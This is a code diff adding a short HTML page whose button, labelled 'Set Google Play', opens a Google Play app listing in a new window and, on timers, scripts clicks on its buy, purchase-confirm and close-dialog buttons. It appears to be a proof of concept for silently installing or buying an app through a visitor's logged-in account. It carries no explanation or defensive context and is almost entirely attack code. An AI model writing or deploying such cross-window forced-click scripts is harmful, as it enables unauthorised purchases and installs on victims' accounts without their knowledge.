@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<div id="accessing_iframe">
+<h2>Accessing Iframe</h2>
+<button id="bad-play" onclick="openWin()">Set Google Play</button>
+</div>
+<br>
+<br>
+
+
+<script>
+
+function openWin() {
+    var mywin = window.open("https://play.google.com/store/apps/details?id=com.google.android.apps.adm", "hihi");
+    {
+        setTimeout(function() {x = mywin.document.getElementsByClassName("price buy id-track-click");
+        x[0].click();}, 10000);
+        setTimeout(function(){
+            mywin.document.getElementById("purchase-ok-button").click();},
+            20000);
+        setTimeout(function(){ 
+            mywin.document.getElementById("close-dialog-button").click();},
+            30000);
+    }
+
+}
+</script>
